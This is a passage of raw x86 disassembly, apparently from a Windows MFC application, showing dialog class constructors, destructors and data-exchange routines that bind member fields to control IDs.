  4023a9:	8d 9e a4 00 00 00    	lea    0xa4(%esi),%ebx
  4023af:	c6 44 24 1c 02       	movb   $0x2,0x1c(%esp)
  4023b4:	8b cb                	mov    %ebx,%ecx
  4023b6:	e8 5b 22 00 00       	call   0x404616
  4023bb:	8d ae a8 00 00 00    	lea    0xa8(%esi),%ebp
  4023c1:	c6 44 24 1c 03       	movb   $0x3,0x1c(%esp)
  4023c6:	8b cd                	mov    %ebp,%ecx
  4023c8:	e8 49 22 00 00       	call   0x404616
  4023cd:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  4023d3:	c6 44 24 1c 04       	movb   $0x4,0x1c(%esp)
  4023d8:	e8 39 22 00 00       	call   0x404616
  4023dd:	c7 86 b4 00 00 00 00 	movl   $0x0,0xb4(%esi)
  4023e4:	00 00 00 
  4023e7:	68 b0 43 45 00       	push   $0x4543b0
  4023ec:	8b cf                	mov    %edi,%ecx
  4023ee:	c6 44 24 20 06       	movb   $0x6,0x20(%esp)
  4023f3:	c7 06 30 6a 40 00    	movl   $0x406a30,(%esi)
  4023f9:	e8 12 22 00 00       	call   0x404610
  4023fe:	68 b0 43 45 00       	push   $0x4543b0
  402403:	8b cb                	mov    %ebx,%ecx
  402405:	e8 06 22 00 00       	call   0x404610
  40240a:	68 b0 43 45 00       	push   $0x4543b0
  40240f:	8b cd                	mov    %ebp,%ecx
  402411:	e8 fa 21 00 00       	call   0x404610
  402416:	68 b0 43 45 00       	push   $0x4543b0
  40241b:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  402421:	e8 ea 21 00 00       	call   0x404610
  402426:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40242a:	c7 86 b0 00 00 00 00 	movl   $0x0,0xb0(%esi)
  402431:	00 00 00 
  402434:	8b c6                	mov    %esi,%eax
  402436:	5f                   	pop    %edi
  402437:	5e                   	pop    %esi
  402438:	5d                   	pop    %ebp
  402439:	5b                   	pop    %ebx
  40243a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402441:	83 c4 10             	add    $0x10,%esp
  402444:	c2 04 00             	ret    $0x4
  402447:	90                   	nop
  402448:	90                   	nop
  402449:	90                   	nop
  40244a:	90                   	nop
  40244b:	90                   	nop
  40244c:	90                   	nop
  40244d:	90                   	nop
  40244e:	90                   	nop
  40244f:	90                   	nop
  402450:	56                   	push   %esi
  402451:	8b f1                	mov    %ecx,%esi
  402453:	e8 18 00 00 00       	call   0x402470
  402458:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40245d:	74 09                	je     0x402468
  40245f:	56                   	push   %esi
  402460:	e8 bd 21 00 00       	call   0x404622
  402465:	83 c4 04             	add    $0x4,%esp
  402468:	8b c6                	mov    %esi,%eax
  40246a:	5e                   	pop    %esi
  40246b:	c2 04 00             	ret    $0x4
  40246e:	90                   	nop
  40246f:	90                   	nop
  402470:	6a ff                	push   $0xffffffff
  402472:	68 fb 4e 40 00       	push   $0x404efb
  402477:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40247d:	50                   	push   %eax
  40247e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402485:	51                   	push   %ecx
  402486:	56                   	push   %esi
  402487:	8b f1                	mov    %ecx,%esi
  402489:	89 74 24 04          	mov    %esi,0x4(%esp)
  40248d:	8b 86 b4 00 00 00    	mov    0xb4(%esi),%eax
  402493:	c7 44 24 10 05 00 00 	movl   $0x5,0x10(%esp)
  40249a:	00 
  40249b:	85 c0                	test   %eax,%eax
  40249d:	74 06                	je     0x4024a5
  40249f:	8b 08                	mov    (%eax),%ecx
  4024a1:	50                   	push   %eax
  4024a2:	ff 51 08             	call   *0x8(%ecx)
  4024a5:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  4024ab:	c6 44 24 10 04       	movb   $0x4,0x10(%esp)
  4024b0:	e8 4f 21 00 00       	call   0x404604
  4024b5:	8d 8e a8 00 00 00    	lea    0xa8(%esi),%ecx
  4024bb:	c6 44 24 10 03       	movb   $0x3,0x10(%esp)
  4024c0:	e8 3f 21 00 00       	call   0x404604
  4024c5:	8d 8e a4 00 00 00    	lea    0xa4(%esi),%ecx
  4024cb:	c6 44 24 10 02       	movb   $0x2,0x10(%esp)
  4024d0:	e8 2f 21 00 00       	call   0x404604
  4024d5:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  4024db:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  4024e0:	e8 1f 21 00 00       	call   0x404604
  4024e5:	8d 4e 60             	lea    0x60(%esi),%ecx
  4024e8:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  4024ed:	e8 a2 21 00 00       	call   0x404694
  4024f2:	8b ce                	mov    %esi,%ecx
  4024f4:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  4024fb:	ff 
  4024fc:	e8 09 21 00 00       	call   0x40460a
  402501:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402505:	5e                   	pop    %esi
  402506:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40250d:	83 c4 10             	add    $0x10,%esp
  402510:	c3                   	ret
  402511:	90                   	nop
  402512:	90                   	nop
  402513:	90                   	nop
  402514:	90                   	nop
  402515:	90                   	nop
  402516:	90                   	nop
  402517:	90                   	nop
  402518:	90                   	nop
  402519:	90                   	nop
  40251a:	90                   	nop
  40251b:	90                   	nop
  40251c:	90                   	nop
  40251d:	90                   	nop
  40251e:	90                   	nop
  40251f:	90                   	nop
  402520:	56                   	push   %esi
  402521:	8b f1                	mov    %ecx,%esi
  402523:	57                   	push   %edi
  402524:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402528:	8d 46 60             	lea    0x60(%esi),%eax
  40252b:	50                   	push   %eax
  40252c:	68 ef 03 00 00       	push   $0x3ef
  402531:	57                   	push   %edi
  402532:	e8 75 21 00 00       	call   0x4046ac
  402537:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  40253d:	51                   	push   %ecx
  40253e:	68 f7 03 00 00       	push   $0x3f7
  402543:	57                   	push   %edi
  402544:	e8 eb 20 00 00       	call   0x404634
  402549:	8d 96 a4 00 00 00    	lea    0xa4(%esi),%edx
  40254f:	52                   	push   %edx
  402550:	68 f5 03 00 00       	push   $0x3f5
  402555:	57                   	push   %edi
  402556:	e8 d9 20 00 00       	call   0x404634
  40255b:	8d 86 a8 00 00 00    	lea    0xa8(%esi),%eax
  402561:	50                   	push   %eax
  402562:	68 f4 03 00 00       	push   $0x3f4
  402567:	57                   	push   %edi
  402568:	e8 c7 20 00 00       	call   0x404634
  40256d:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  402573:	51                   	push   %ecx
  402574:	68 f3 03 00 00       	push   $0x3f3
  402579:	57                   	push   %edi
  40257a:	e8 b5 20 00 00       	call   0x404634
  40257f:	81 c6 b0 00 00 00    	add    $0xb0,%esi
  402585:	56                   	push   %esi
  402586:	68 f6 03 00 00       	push   $0x3f6
  40258b:	57                   	push   %edi
  40258c:	e8 9d 20 00 00       	call   0x40462e
  402591:	5f                   	pop    %edi
  402592:	5e                   	pop    %esi
  402593:	c2 04 00             	ret    $0x4
  402596:	90                   	nop
  402597:	90                   	nop
  402598:	90                   	nop
  402599:	90                   	nop
  40259a:	90                   	nop
  40259b:	90                   	nop
  40259c:	90                   	nop
  40259d:	90                   	nop
  40259e:	90                   	nop
  40259f:	90                   	nop
  4025a0:	b8 98 69 40 00       	mov    $0x406998,%eax
  4025a5:	c3                   	ret
  4025a6:	90                   	nop
  4025a7:	90                   	nop
  4025a8:	90                   	nop
  4025a9:	90                   	nop
  4025aa:	90                   	nop
  4025ab:	90                   	nop
  4025ac:	90                   	nop
  4025ad:	90                   	nop
  4025ae:	90                   	nop
  4025af:	90                   	nop
  4025b0:	c2 08 00             	ret    $0x8
  4025b3:	90                   	nop
  4025b4:	90                   	nop
  4025b5:	90                   	nop
  4025b6:	90                   	nop
  4025b7:	90                   	nop
  4025b8:	90                   	nop
  4025b9:	90                   	nop
  4025ba:	90                   	nop
  4025bb:	90                   	nop
  4025bc:	90                   	nop
  4025bd:	90                   	nop
  4025be:	90                   	nop
  4025bf:	90                   	nop
  4025c0:	6a ff                	push   $0xffffffff
  4025c2:	68 77 4f 40 00       	push   $0x404f77
  4025c7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4025cd:	50                   	push   %eax
  4025ce:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4025d5:	51                   	push   %ecx
  4025d6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4025da:	53                   	push   %ebx
  4025db:	55                   	push   %ebp
  4025dc:	56                   	push   %esi
  4025dd:	57                   	push   %edi
  4025de:	8b f1                	mov    %ecx,%esi
  4025e0:	50                   	push   %eax
  4025e1:	68 86 00 00 00       	push   $0x86
  4025e6:	89 74 24 18          	mov    %esi,0x18(%esp)
  4025ea:	e8 2d 20 00 00       	call   0x40461c
  4025ef:	8d 7e 60             	lea    0x60(%esi),%edi
  4025f2:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4025f9:	00 
  4025fa:	8b cf                	mov    %edi,%ecx
  4025fc:	e8 9f 20 00 00       	call   0x4046a0
  402601:	c7 07 d0 65 40 00    	movl   $0x4065d0,(%edi)
  402607:	8d be a4 00 00 00    	lea    0xa4(%esi),%edi
  40260d:	c6 44 24 1c 01       	movb   $0x1,0x1c(%esp)
  402612:	8b cf                	mov    %edi,%ecx
  402614:	e8 fd 1f 00 00       	call   0x404616
  402619:	8d 9e a8 00 00 00    	lea    0xa8(%esi),%ebx
  40261f:	c6 44 24 1c 02       	movb   $0x2,0x1c(%esp)
  402624:	8b cb                	mov    %ebx,%ecx
  402626:	e8 eb 1f 00 00       	call   0x404616
  40262b:	8d ae ac 00 00 00    	lea    0xac(%esi),%ebp
  402631:	c6 44 24 1c 03       	movb   $0x3,0x1c(%esp)
  402636:	8b cd                	mov    %ebp,%ecx
  402638:	e8 d9 1f 00 00       	call   0x404616
  40263d:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  402643:	c6 44 24 1c 04       	movb   $0x4,0x1c(%esp)
  402648:	e8 c9 1f 00 00       	call   0x404616
  40264d:	8d 8e b8 00 00 00    	lea    0xb8(%esi),%ecx
  402653:	c6 44 24 1c 05       	movb   $0x5,0x1c(%esp)
  402658:	e8 b9 1f 00 00       	call   0x404616
  40265d:	33 c0                	xor    %eax,%eax
  40265f:	89 86 bc 00 00 00    	mov    %eax,0xbc(%esi)
  402665:	c7 06 88 6b 40 00    	movl   $0x406b88,(%esi)
  40266b:	68 b0 43 45 00       	push   $0x4543b0
  402670:	8b cf                	mov    %edi,%ecx
  402672:	c6 44 24 20 07       	movb   $0x7,0x20(%esp)
  402677:	89 86 a0 00 00 00    	mov    %eax,0xa0(%esi)
  40267d:	e8 8e 1f 00 00       	call   0x404610
  402682:	68 b0 43 45 00       	push   $0x4543b0
  402687:	8b cb                	mov    %ebx,%ecx
  402689:	e8 82 1f 00 00       	call   0x404610
  40268e:	68 b0 43 45 00       	push   $0x4543b0
  402693:	8b cd                	mov    %ebp,%ecx
  402695:	e8 76 1f 00 00       	call   0x404610
  40269a:	68 b0 43 45 00       	push   $0x4543b0
  40269f:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  4026a5:	e8 66 1f 00 00       	call   0x404610
  4026aa:	68 b0 43 45 00       	push   $0x4543b0
  4026af:	8d 8e b8 00 00 00    	lea    0xb8(%esi),%ecx
  4026b5:	c7 86 b4 00 00 00 00 	movl   $0x0,0xb4(%esi)
  4026bc:	00 00 00 
  4026bf:	e8 4c 1f 00 00       	call   0x404610
  4026c4:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4026c8:	8b c6                	mov    %esi,%eax
  4026ca:	5f                   	pop    %edi
  4026cb:	5e                   	pop    %esi
  4026cc:	5d                   	pop    %ebp
  4026cd:	5b                   	pop    %ebx
  4026ce:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4026d5:	83 c4 10             	add    $0x10,%esp
  4026d8:	c2 04 00             	ret    $0x4
  4026db:	90                   	nop
  4026dc:	90                   	nop
  4026dd:	90                   	nop
  4026de:	90                   	nop
  4026df:	90                   	nop
  4026e0:	56                   	push   %esi
  4026e1:	8b f1                	mov    %ecx,%esi
  4026e3:	e8 18 00 00 00       	call   0x402700
  4026e8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4026ed:	74 09                	je     0x4026f8
  4026ef:	56                   	push   %esi
  4026f0:	e8 2d 1f 00 00       	call   0x404622
  4026f5:	83 c4 04             	add    $0x4,%esp
  4026f8:	8b c6                	mov    %esi,%eax
  4026fa:	5e                   	pop    %esi
  4026fb:	c2 04 00             	ret    $0x4
  4026fe:	90                   	nop
  4026ff:	90                   	nop
  402700:	6a ff                	push   $0xffffffff
  402702:	68 e9 4f 40 00       	push   $0x404fe9
  402707:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40270d:	50                   	push   %eax
  40270e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402715:	51                   	push   %ecx
  402716:	56                   	push   %esi
  402717:	8b f1                	mov    %ecx,%esi
  402719:	89 74 24 04          	mov    %esi,0x4(%esp)
  40271d:	8b 86 bc 00 00 00    	mov    0xbc(%esi),%eax
  402723:	c7 44 24 10 06 00 00 	movl   $0x6,0x10(%esp)
  40272a:	00 
  40272b:	85 c0                	test   %eax,%eax
  40272d:	74 06                	je     0x402735
  40272f:	8b 08                	mov    (%eax),%ecx
  402731:	50                   	push   %eax
  402732:	ff 51 08             	call   *0x8(%ecx)
  402735:	8d 8e b8 00 00 00    	lea    0xb8(%esi),%ecx
  40273b:	c6 44 24 10 05       	movb   $0x5,0x10(%esp)
  402740:	e8 bf 1e 00 00       	call   0x404604
  402745:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  40274b:	c6 44 24 10 04       	movb   $0x4,0x10(%esp)
  402750:	e8 af 1e 00 00       	call   0x404604
  402755:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  40275b:	c6 44 24 10 03       	movb   $0x3,0x10(%esp)
  402760:	e8 9f 1e 00 00       	call   0x404604
  402765:	8d 8e a8 00 00 00    	lea    0xa8(%esi),%ecx
  40276b:	c6 44 24 10 02       	movb   $0x2,0x10(%esp)
  402770:	e8 8f 1e 00 00       	call   0x404604
  402775:	8d 8e a4 00 00 00    	lea    0xa4(%esi),%ecx
  40277b:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  402780:	e8 7f 1e 00 00       	call   0x404604
  402785:	8d 4e 60             	lea    0x60(%esi),%ecx
  402788:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  40278d:	e8 02 1f 00 00       	call   0x404694
  402792:	8b ce                	mov    %esi,%ecx
  402794:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  40279b:	ff 
  40279c:	e8 69 1e 00 00       	call   0x40460a
  4027a1:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4027a5:	5e                   	pop    %esi
  4027a6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4027ad:	83 c4 10             	add    $0x10,%esp
  4027b0:	c3                   	ret
  4027b1:	90                   	nop
  4027b2:	90                   	nop
  4027b3:	90                   	nop
  4027b4:	90                   	nop
  4027b5:	90                   	nop
  4027b6:	90                   	nop
  4027b7:	90                   	nop
  4027b8:	90                   	nop
  4027b9:	90                   	nop
  4027ba:	90                   	nop
  4027bb:	90                   	nop
  4027bc:	90                   	nop
  4027bd:	90                   	nop
  4027be:	90                   	nop
  4027bf:	90                   	nop
  4027c0:	53                   	push   %ebx
  4027c1:	56                   	push   %esi
  4027c2:	8b f1                	mov    %ecx,%esi
  4027c4:	57                   	push   %edi
  4027c5:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4027c9:	8d 46 60             	lea    0x60(%esi),%eax
  4027cc:	50                   	push   %eax
  4027cd:	68 09 04 00 00       	push   $0x409
  4027d2:	57                   	push   %edi
  4027d3:	e8 d4 1e 00 00       	call   0x4046ac
  4027d8:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  4027de:	51                   	push   %ecx
  4027df:	68 21 04 00 00       	push   $0x421
  4027e4:	57                   	push   %edi
  4027e5:	e8 bc 1e 00 00       	call   0x4046a6
  4027ea:	8d 96 a4 00 00 00    	lea    0xa4(%esi),%edx
  4027f0:	52                   	push   %edx
  4027f1:	68 fc 03 00 00       	push   $0x3fc
  4027f6:	57                   	push   %edi
  4027f7:	e8 38 1e 00 00       	call   0x404634
  4027fc:	8d 86 a8 00 00 00    	lea    0xa8(%esi),%eax
  402802:	50                   	push   %eax
  402803:	68 35 04 00 00       	push   $0x435
  402808:	57                   	push   %edi
  402809:	e8 26 1e 00 00       	call   0x404634
  40280e:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  402814:	51                   	push   %ecx
  402815:	68 fd 03 00 00       	push   $0x3fd
  40281a:	57                   	push   %edi
  40281b:	e8 14 1e 00 00       	call   0x404634
  402820:	8d 96 b0 00 00 00    	lea    0xb0(%esi),%edx
  402826:	52                   	push   %edx
  402827:	68 ff 03 00 00       	push   $0x3ff
  40282c:	57                   	push   %edi
  40282d:	e8 02 1e 00 00       	call   0x404634
  402832:	8d 9e b4 00 00 00    	lea    0xb4(%esi),%ebx
  402838:	53                   	push   %ebx
  402839:	68 1c 04 00 00       	push   $0x41c
  40283e:	57                   	push   %edi
  40283f:	e8 ea 1d 00 00       	call   0x40462e
  402844:	68 00 40 1c 46       	push   $0x461c4000
  402849:	68 00 00 80 3f       	push   $0x3f800000
  40284e:	53                   	push   %ebx
  40284f:	57                   	push   %edi
  402850:	e8 d3 1d 00 00       	call   0x404628
  402855:	81 c6 b8 00 00 00    	add    $0xb8,%esi
  40285b:	56                   	push   %esi
  40285c:	68 37 04 00 00       	push   $0x437
  402861:	57                   	push   %edi
  402862:	e8 cd 1d 00 00       	call   0x404634
  402867:	5f                   	pop    %edi
  402868:	5e                   	pop    %esi
  402869:	5b                   	pop    %ebx
  40286a:	c2 04 00             	ret    $0x4
  40286d:	90                   	nop
  40286e:	90                   	nop
  40286f:	90                   	nop
  402870:	a1 c0 60 40 00       	mov    0x4060c0,%eax
  402875:	c3                   	ret
  402876:	90                   	nop
  402877:	90                   	nop
  402878:	90                   	nop
  402879:	90                   	nop
  40287a:	90                   	nop
  40287b:	90                   	nop
  40287c:	90                   	nop
  40287d:	90                   	nop
  40287e:	90                   	nop
  40287f:	90                   	nop
  402880:	b8 08 6b 40 00       	mov    $0x406b08,%eax
  402885:	c3                   	ret
  402886:	90                   	nop
  402887:	90                   	nop
  402888:	90                   	nop
  402889:	90                   	nop
  40288a:	90                   	nop
  40288b:	90                   	nop
  40288c:	90                   	nop
  40288d:	90                   	nop
  40288e:	90                   	nop
  40288f:	90                   	nop
  402890:	e8 73 1c 00 00       	call   0x404508
  402895:	b8 01 00 00 00       	mov    $0x1,%eax
  40289a:	c3                   	ret
  40289b:	90                   	nop
  40289c:	90                   	nop
  40289d:	90                   	nop
  40289e:	90                   	nop
  40289f:	90                   	nop
  4028a0:	6a ff                	push   $0xffffffff
  4028a2:	68 20 50 40 00       	push   $0x405020
  4028a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4028ad:	50                   	push   %eax
  4028ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4028b5:	83 ec 08             	sub    $0x8,%esp
  4028b8:	53                   	push   %ebx
  4028b9:	55                   	push   %ebp
  4028ba:	56                   	push   %esi
  4028bb:	8b f1                	mov    %ecx,%esi
  4028bd:	57                   	push   %edi
  4028be:	6a 00                	push   $0x0
  4028c0:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  4028c6:	6a 00                	push   $0x0
  4028c8:	68 42 10 00 00       	push   $0x1042
  4028cd:	50                   	push   %eax
  4028ce:	ff 15 34 63 40 00    	call   *0x406334
  4028d4:	8b f8                	mov    %eax,%edi
  4028d6:	6a 00                	push   $0x0
  4028d8:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4028dc:	8d 5e 60             	lea    0x60(%esi),%ebx
  4028df:	57                   	push   %edi
  4028e0:	51                   	push   %ecx
  4028e1:	8b cb                	mov    %ebx,%ecx
  4028e3:	e8 dc 1d 00 00       	call   0x4046c4
  4028e8:	50                   	push   %eax
  4028e9:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  4028ef:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4028f6:	00 
  4028f7:	e8 c2 1d 00 00       	call   0x4046be
  4028fc:	83 cd ff             	or     $0xffffffff,%ebp
  4028ff:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402903:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402907:	e8 f8 1c 00 00       	call   0x404604
  40290c:	6a 01                	push   $0x1
  40290e:	8d 54 24 14          	lea    0x14(%esp),%edx
  402912:	57                   	push   %edi
  402913:	52                   	push   %edx
  402914:	8b cb                	mov    %ebx,%ecx
  402916:	e8 a9 1d 00 00       	call   0x4046c4
  40291b:	50                   	push   %eax
  40291c:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  402922:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  402929:	00 
  40292a:	e8 8f 1d 00 00       	call   0x4046be
  40292f:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402933:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402937:	e8 c8 1c 00 00       	call   0x404604
  40293c:	6a 02                	push   $0x2
  40293e:	8d 44 24 14          	lea    0x14(%esp),%eax
  402942:	57                   	push   %edi
  402943:	50                   	push   %eax
  402944:	8b cb                	mov    %ebx,%ecx
  402946:	e8 79 1d 00 00       	call   0x4046c4
  40294b:	50                   	push   %eax
  40294c:	8d 8e a8 00 00 00    	lea    0xa8(%esi),%ecx
  402952:	c7 44 24 24 02 00 00 	movl   $0x2,0x24(%esp)
  402959:	00 
  40295a:	e8 5f 1d 00 00       	call   0x4046be
  40295f:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402963:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402967:	e8 98 1c 00 00       	call   0x404604
  40296c:	6a 03                	push   $0x3
  40296e:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402972:	57                   	push   %edi
  402973:	51                   	push   %ecx
  402974:	8b cb                	mov    %ebx,%ecx
  402976:	e8 49 1d 00 00       	call   0x4046c4
  40297b:	8b 00                	mov    (%eax),%eax
  40297d:	50                   	push   %eax
  40297e:	ff 15 d0 62 40 00    	call   *0x4062d0
  402984:	d9 9e b4 00 00 00    	fstps  0xb4(%esi)
  40298a:	83 c4 04             	add    $0x4,%esp
  40298d:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402991:	e8 6e 1c 00 00       	call   0x404604
  402996:	6a 04                	push   $0x4
  402998:	8d 54 24 18          	lea    0x18(%esp),%edx
  40299c:	57                   	push   %edi
  40299d:	52                   	push   %edx
  40299e:	8b cb                	mov    %ebx,%ecx
  4029a0:	e8 1f 1d 00 00       	call   0x4046c4
  4029a5:	50                   	push   %eax
  4029a6:	8d 8e b8 00 00 00    	lea    0xb8(%esi),%ecx
  4029ac:	c7 44 24 24 03 00 00 	movl   $0x3,0x24(%esp)
  4029b3:	00 
  4029b4:	e8 05 1d 00 00       	call   0x4046be
  4029b9:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  4029bd:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4029c1:	e8 3e 1c 00 00       	call   0x404604
  4029c6:	6a 00                	push   $0x0
  4029c8:	8b ce                	mov    %esi,%ecx
  4029ca:	e8 e3 1c 00 00       	call   0x4046b2
  4029cf:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4029d3:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4029d7:	5f                   	pop    %edi
  4029d8:	5e                   	pop    %esi
  4029d9:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4029df:	5d                   	pop    %ebp
  4029e0:	5b                   	pop    %ebx
  4029e1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4029e8:	83 c4 14             	add    $0x14,%esp
  4029eb:	c2 08 00             	ret    $0x8
  4029ee:	90                   	nop
  4029ef:	90                   	nop
  4029f0:	6a ff                	push   $0xffffffff
  4029f2:	68 a5 50 40 00       	push   $0x4050a5
  4029f7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4029fd:	50                   	push   %eax
  4029fe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402a05:	51                   	push   %ecx
  402a06:	8b 44 24 14          	mov    0x14(%esp),%eax
  402a0a:	53                   	push   %ebx
  402a0b:	55                   	push   %ebp
  402a0c:	56                   	push   %esi
  402a0d:	57                   	push   %edi
  402a0e:	8b f1                	mov    %ecx,%esi
  402a10:	50                   	push   %eax
  402a11:	68 87 00 00 00       	push   $0x87
  402a16:	89 74 24 18          	mov    %esi,0x18(%esp)
  402a1a:	e8 fd 1b 00 00       	call   0x40461c
  402a1f:	8d 7e 60             	lea    0x60(%esi),%edi
  402a22:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402a29:	00 
  402a2a:	8b cf                	mov    %edi,%ecx
  402a2c:	e8 6f 1c 00 00       	call   0x4046a0
  402a31:	c7 07 d0 65 40 00    	movl   $0x4065d0,(%edi)
  402a37:	8d be a0 00 00 00    	lea    0xa0(%esi),%edi
  402a3d:	c6 44 24 1c 01       	movb   $0x1,0x1c(%esp)
  402a42:	8b cf                	mov    %edi,%ecx
  402a44:	e8 cd 1b 00 00       	call   0x404616
  402a49:	8d 9e a4 00 00 00    	lea    0xa4(%esi),%ebx
  402a4f:	c6 44 24 1c 02       	movb   $0x2,0x1c(%esp)
  402a54:	8b cb                	mov    %ebx,%ecx
  402a56:	e8 bb 1b 00 00       	call   0x404616
  402a5b:	8d ae a8 00 00 00    	lea    0xa8(%esi),%ebp
  402a61:	c6 44 24 1c 03       	movb   $0x3,0x1c(%esp)
  402a66:	8b cd                	mov    %ebp,%ecx
  402a68:	e8 a9 1b 00 00       	call   0x404616
  402a6d:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  402a73:	c6 44 24 1c 04       	movb   $0x4,0x1c(%esp)
  402a78:	e8 99 1b 00 00       	call   0x404616
  402a7d:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  402a83:	c6 44 24 1c 05       	movb   $0x5,0x1c(%esp)
  402a88:	e8 89 1b 00 00       	call   0x404616
  402a8d:	8d 8e b4 00 00 00    	lea    0xb4(%esi),%ecx
  402a93:	c6 44 24 1c 06       	movb   $0x6,0x1c(%esp)
  402a98:	e8 79 1b 00 00       	call   0x404616
  402a9d:	c7 86 bc 00 00 00 00 	movl   $0x0,0xbc(%esi)
  402aa4:	00 00 00 
  402aa7:	68 b0 43 45 00       	push   $0x4543b0
  402aac:	8b cf                	mov    %edi,%ecx
  402aae:	c6 44 24 20 08       	movb   $0x8,0x20(%esp)
  402ab3:	c7 06 e0 6c 40 00    	movl   $0x406ce0,(%esi)
  402ab9:	e8 52 1b 00 00       	call   0x404610
  402abe:	68 b0 43 45 00       	push   $0x4543b0
  402ac3:	8b cb                	mov    %ebx,%ecx
  402ac5:	e8 46 1b 00 00       	call   0x404610
  402aca:	68 b0 43 45 00       	push   $0x4543b0
  402acf:	8b cd                	mov    %ebp,%ecx
  402ad1:	e8 3a 1b 00 00       	call   0x404610
  402ad6:	68 b0 43 45 00       	push   $0x4543b0
  402adb:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  402ae1:	e8 2a 1b 00 00       	call   0x404610
  402ae6:	68 b0 43 45 00       	push   $0x4543b0
  402aeb:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  402af1:	e8 1a 1b 00 00       	call   0x404610
  402af6:	68 b0 43 45 00       	push   $0x4543b0
  402afb:	8d 8e b4 00 00 00    	lea    0xb4(%esi),%ecx
  402b01:	e8 0a 1b 00 00       	call   0x404610
  402b06:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402b0a:	c7 86 b8 00 00 00 00 	movl   $0x0,0xb8(%esi)
  402b11:	00 00 00 
  402b14:	8b c6                	mov    %esi,%eax
  402b16:	5f                   	pop    %edi
  402b17:	5e                   	pop    %esi
  402b18:	5d                   	pop    %ebp
  402b19:	5b                   	pop    %ebx
  402b1a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402b21:	83 c4 10             	add    $0x10,%esp
  402b24:	c2 04 00             	ret    $0x4
  402b27:	90                   	nop
  402b28:	90                   	nop
  402b29:	90                   	nop
  402b2a:	90                   	nop
  402b2b:	90                   	nop
  402b2c:	90                   	nop
  402b2d:	90                   	nop
  402b2e:	90                   	nop
  402b2f:	90                   	nop
  402b30:	56                   	push   %esi
  402b31:	8b f1                	mov    %ecx,%esi
  402b33:	e8 18 00 00 00       	call   0x402b50
  402b38:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402b3d:	74 09                	je     0x402b48
  402b3f:	56                   	push   %esi
  402b40:	e8 dd 1a 00 00       	call   0x404622
  402b45:	83 c4 04             	add    $0x4,%esp
  402b48:	8b c6                	mov    %esi,%eax
  402b4a:	5e                   	pop    %esi
  402b4b:	c2 04 00             	ret    $0x4
  402b4e:	90                   	nop
  402b4f:	90                   	nop
  402b50:	6a ff                	push   $0xffffffff
  402b52:	68 17 51 40 00       	push   $0x405117
  402b57:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402b5d:	50                   	push   %eax
